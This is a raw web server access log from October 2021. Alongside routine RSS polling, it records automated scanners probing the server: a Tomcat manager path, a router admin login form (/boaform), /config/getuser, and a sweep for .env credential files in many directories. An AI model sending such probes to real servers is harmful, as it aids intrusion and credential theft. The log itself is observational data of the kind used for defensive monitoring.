80.82.70.228 - - [24/Oct/2021:23:02:15 +0200] "GET / HTTP/1.0" 301 162 "-" "Mozilla/5.0 (Linux; Android 5.1; Lenovo P70-A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
5.8.10.202 - - [24/Oct/2021:23:02:56 +0200] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03Y\xB0k\x87\xF1\xCD=\xED\x03\x8E\x098fA\xF2\xB7\x15\x84\x5C\xD70\xF3\xD5;\xC0#\xFA\x9C\xEE\x5C\xCA\xA2 X\x93.\xCF\xDA\xE4\xBF\xB4\xB1\xE5Y\x8D\xCE*\xF5\xC4\xBB{~\x0E\xD3\xEA\xD2\x1E(\x9C^t\xD4W`\x9F\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
5.8.10.202 - - [24/Oct/2021:23:02:56 +0200] "GET /aaa9 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
5.8.10.202 - - [24/Oct/2021:23:02:56 +0200] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA4\xA7+\x00\xEB|\xAF\xD4\xB0\x5C\xF7\x8AMQ\x8F\x15o\xEERb\xF9=d\xBB\xF6\xAA]\x80\xA3\xE0-^ \xC1VO\xBC@B\x97n\x1F\x9FL\xF6n\xD3\x03d\x8B,\xD5\xCD\x94\x9CEfe_\x93\x07\x8D\x8F\xBE\xB4\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
5.8.10.202 - - [24/Oct/2021:23:02:56 +0200] "GET /aab9 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
5.173.42.7 - - [24/Oct/2021:23:05:23 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 OPR/80.0.4170.63"
5.173.42.7 - - [24/Oct/2021:23:20:23 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 OPR/80.0.4170.63"
192.241.199.126 - - [24/Oct/2021:23:24:35 +0200] "GET /manager/text/list HTTP/1.1" 400 248 "-" "Mozilla/5.0 zgrab/0.x"
209.141.56.209 - - [24/Oct/2021:23:27:54 +0200] "GET / HTTP/1.1" 301 162 "-" "Linux Gnu (cow)"
5.173.42.7 - - [24/Oct/2021:23:35:23 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 OPR/80.0.4170.63"
209.141.62.185 - - [24/Oct/2021:23:55:23 +0200] "GET /config/getuser?index=0 HTTP/1.1" 400 248 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
209.141.51.171 - - [24/Oct/2021:23:58:17 +0200] "POST /boaform/admin/formLogin HTTP/1.1" 301 162 "http://85.255.1.106:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
209.141.51.171 - - [24/Oct/2021:23:58:17 +0200] "" 400 0 "-" "-"
52.91.143.24 - - [25/Oct/2021:00:20:19 +0200] "GET /rss HTTP/1.1" 301 5 "-" "Ruby"
52.91.143.24 - - [25/Oct/2021:00:20:19 +0200] "GET /rss/ HTTP/1.1" 200 2217 "-" "Ruby"
209.141.41.12 - - [25/Oct/2021:00:41:38 +0200] "GET /config/getuser?index=0 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
178.62.229.155 - - [25/Oct/2021:00:58:27 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
178.62.229.155 - - [25/Oct/2021:01:08:52 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
13.250.53.118 - - [25/Oct/2021:01:24:05 +0200] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
13.250.53.118 - - [25/Oct/2021:01:24:05 +0200] "GET /conf/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
13.250.53.118 - - [25/Oct/2021:01:24:06 +0200] "GET /wp-content/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
13.250.53.118 - - [25/Oct/2021:01:24:06 +0200] "GET /wp-admin/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
13.250.53.118 - - [25/Oct/2021:01:24:07 +0200] "GET /library/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
13.250.53.118 - - [25/Oct/2021:01:24:08 +0200] "GET /new/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
13.250.53.118 - - [25/Oct/2021:01:24:08 +0200] "GET /vendor/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
13.250.53.118 - - [25/Oct/2021:01:24:09 +0200] "GET /old/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
13.250.53.118 - - [25/Oct/2021:01:24:09 +0200] "GET /local/.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
